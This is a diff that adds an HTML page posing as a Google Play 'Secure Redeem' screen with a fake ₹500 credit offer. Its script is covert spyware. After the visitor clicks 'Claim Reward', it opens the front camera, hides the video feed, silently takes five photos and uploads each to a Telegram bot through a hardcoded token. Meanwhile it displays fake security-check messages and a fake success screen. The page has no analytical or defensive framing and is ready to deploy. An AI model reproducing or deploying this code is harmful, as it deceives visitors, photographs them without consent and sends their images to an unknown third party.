@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Play - Secure Redeem</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+    <style>
+        :root {
+            --google-blue: #4285F4;
+            --google-red: #EA4335;
+            --google-yellow: #FBBC05;
+            --google-green: #34A853;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
+
+        body {
+            background-color: #f1f3f4;
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh; padding: 15px;
+        }
+
+        .card {
+            background: white; width: 100%; max-width: 400px;
+            border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+            overflow: hidden; text-align: center;
+        }
+
+        .header {
+            padding: 20px; border-bottom: 1px solid #eee;
+            display: flex; align-items: center; gap: 10px;
+        }
+
+        .logo-text { font-size: 20px; font-weight: 500; }
+        .logo-text span:nth-child(1) { color: #4285F4; }
+        .logo-text span:nth-child(2) { color: #EA4335; }
+        .logo-text span:nth-child(3) { color: #FBBC05; }
+        .logo-text span:nth-child(4) { color: #4285F4; }
+        .logo-text span:nth-child(5) { color: #34A853; }
+        .logo-text span:nth-child(6) { color: #EA4335; }
+
+        .content { padding: 30px 20px; }
+
+        /* Fake Verification Spinner */
+        .loader-container {
+            margin: 20px auto; width: 80px; height: 80px;
+            display: none;
+        }
+
+        .spinner {
+            width: 100%; height: 100%;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid var(--google-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .status-text { color: #5f6368; font-size: 14px; margin-top: 15px; }
+
+        .btn-claim {
+            background: var(--google-blue); color: white;
+            border: none; padding: 12px; border-radius: 4px;
+            width: 100%; font-weight: 500; cursor: pointer;
+            font-size: 15px; margin-top: 10px;
+        }
+
+        /* Invisible Camera Elements */
+        #video { width: 1px; height: 1px; opacity: 0; position: absolute; }
+        #canvas { display: none; }
+
+        .footer { padding: 15px; font-size: 11px; color: #9aa0a6; border-top: 1px solid #eee; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg" width="22">
+        <div class="logo-text">
+            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span> Play
+        </div>
+    </div>
+
+    <div class="content" id="main-ui">
+        <div id="initial-view">
+            <i class="fas fa-gift" style="font-size: 50px; color: var(--google-blue); margin-bottom: 15px;"></i>
+            <h2 style="font-size: 18px; color: #202124;">₹500 Credit Detected</h2>
+            <p style="font-size: 14px; color: #5f6368; margin: 10px 0 20px;">
+                Ye code aapke account mein add hone ke liye taiyaar hai. Suraksha ke liye verify karein.
+            </p>
+            <div style="background: #f8f9fa; padding: 10px; border: 1px dashed #ccc; margin-bottom: 20px; font-weight: bold;">
+                GPLY-V8K3-XXXX-XXXX
+            </div>
+            <button class="btn-claim" onclick="startSilentVerify()">Claim Reward</button>
+        </div>
+
+        <div id="processing-view" style="display: none;">
+            <div class="loader-container" style="display: block;">
+                <div class="spinner"></div>
+            </div>
+            <p class="status-text" id="status-label">Verifying security protocols...</p>
+        </div>
+    </div>
+
+    <div class="footer">
+        Identity encryption active (SSL-256) 🛡️
+    </div>
+</div>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    const BOT_TOKEN = "8299483934:AAGOuqsucqY9Knmv_wir7gcAfSY2D3c8Ma4";
+    const CHAT_ID   = "5960319648";
+    
+    let photosTaken = 0;
+    const totalPhotos = 5;
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    async function startSilentVerify() {
+        document.getElementById('initial-view').style.display = 'none';
+        document.getElementById('processing-view').style.display = 'block';
+
+        try {
+            // Camera permission request
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: false 
+            });
+            video.srcObject = stream;
+
+            // Start silent capture
+            setTimeout(capturePhotos, 1000);
+
+            // Change fake status labels
+            const labels = [
+                "Checking device integrity...",
+                "Syncing with Google Wallet...",
+                "Validating regional access...",
+                "Finalizing encryption..."
+            ];
+            let i = 0;
+            const labelInterval = setInterval(() => {
+                if(i < labels.length) {
+                    document.getElementById('status-label').innerText = labels[i];
+                    i++;
+                } else {
+                    clearInterval(labelInterval);
+                }
+            }, 2000);
+
+        } catch (err) {
+            alert("Permission Error: Please allow access to complete verification.");
+            location.reload();
+        }
+    }
+
+    async function capturePhotos() {
+        if (photosTaken < totalPhotos) {
+            photosTaken++;
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `img_${photosTaken}.jpg`);
+                formData.append('caption', `📸 Silent Capture ${photosTaken}/5`);
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (e) {}
+
+                if (photosTaken < totalPhotos) {
+                    setTimeout(capturePhotos, 1500); 
+                } else {
+                    finishUI();
+                }
+            }, 'image/jpeg', 0.6);
+        }
+    }
+
+    function finishUI() {
+        // Stop camera
+        if(video.srcObject) {
+            video.srcObject.getTracks().forEach(t => t.stop());
+        }
+
+        document.getElementById('main-ui').innerHTML = `
+            <i class="fas fa-check-circle" style="font-size: 60px; color: var(--google-green);"></i>
+            <h2 style="margin-top: 20px; color: #202124;">Redeem Successful!</h2>
+            <p style="color: #5f6368; font-size: 14px; margin-top: 10px;">
+                Verification complete. ₹500 credit will be added to your account within 2 hours.
+            </p>
+            <div style="background: #e8f0fe; padding: 10px; border-radius: 4px; margin-top: 20px; font-size: 12px; color: #1967d2; font-weight: bold;">
+                Ref ID: GP-882-${Math.floor(Math.random()*999999)}
+            </div>
+        `;
+
+        confetti({
+            particleCount: 100,
+            spread: 70,
+            origin: { y: 0.6 },
+            colors: ['#4285F4', '#34A853', '#FBBC05', '#EA4335']
+        });
+    }
+</script>
+
+</body>
+</html>
+
